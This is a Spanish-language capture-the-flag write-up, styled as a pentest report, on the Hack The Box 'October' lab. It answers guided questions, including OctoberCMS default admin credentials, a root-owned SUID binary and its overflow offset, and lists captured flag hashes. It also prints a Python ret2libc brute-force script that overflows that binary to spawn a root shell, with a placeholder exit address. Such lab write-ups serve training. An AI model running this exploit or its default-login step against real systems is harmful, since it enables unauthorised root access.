# Informe Técnico de Seguridad Ofensiva: October

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **October** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | October |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many TCP ports are listening on October?**

R:  2

![Captura de pantalla 2025-08-26 223351.png](./images/step_01.png)

**What is the name of the content management system responsible for the website on TCP 80?**

R: OctoberCMS

![image.png](./images/step_02.png)

**What is the default password for the admin user on October CMS?**

R:admin

![image.png](./images/step_03.png)

**Which of the following PHP extensions will run as PHP code and is not blocked by the CMS when doing a media upload? Choose from "php", "php4", "php5", "phtml", "ppp".**

R:

![image.png](./images/step_04.png)

![image.png](./images/step_05.png)

![image.png](./images/step_06.png)

**What user is the CMS running as on October?**

R: www-data 

![image.png](./images/step_07.png)

![Captura de pantalla 2025-08-26 230801.png](./images/step_08.png)

**What user is the website running as?**

R: www-data

![image.png](./images/step_09.png)

**Submit the flag located in the harry user's home directory.**

R: a2d24a662234a32f4f4db1209684052c

![image.png](./images/step_10.png)

**What is the full path of the file owned by root that has the SetUID permission and is custom to October?**

R: /usr/local/bin/ovrflw

![image.png](./images/step_11.png)

How many bytes into the user provided data that will overwrite EIP?

R: 112

![image.png](./images/step_12.png)

![image.png](./images/step_13.png)

**Submit the flag located in the root user's home directory.**

R: b22c735b4d061ec7774e3db80318c4e1

![image.png](./images/step_14.png)

```jsx
#!/usr/bin/env python2

import struct
import subprocess


libcBase      = 0xb75eb000
systemOffset  = 0x00040310
binShOffset   = 0x00162bac
exitAddrValue = 0xd34db33f  # TODO: replace with real exit() address

systemAddr = struct.pack("<I", libcBase + systemOffset)
exitAddr   = struct.pack("<I", exitAddrValue)
binShAddr  = struct.pack("<I", libcBase + binShOffset)


payload  = "\x90" * 112
payload += systemAddr      # RET -> system()
payload += exitAddr        # RET of system() -> exit()
payload += binShAddr       # arg to system() -> "/bin/sh"


if "\x00" in payload:
    idx = [i for i, c in enumerate(payload) if c == "\x00"]
    print "[!] Payload contains \\x00 at positions:", idx

i = 0
while True:
    i += 1
    if i % 10 == 0:
        print "Attempts:", i
    subprocess.call(["/usr/local/bin/ovrflw", payload])

```

![image.png](./images/step_15.png)

OctoberCMSPassword!!

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
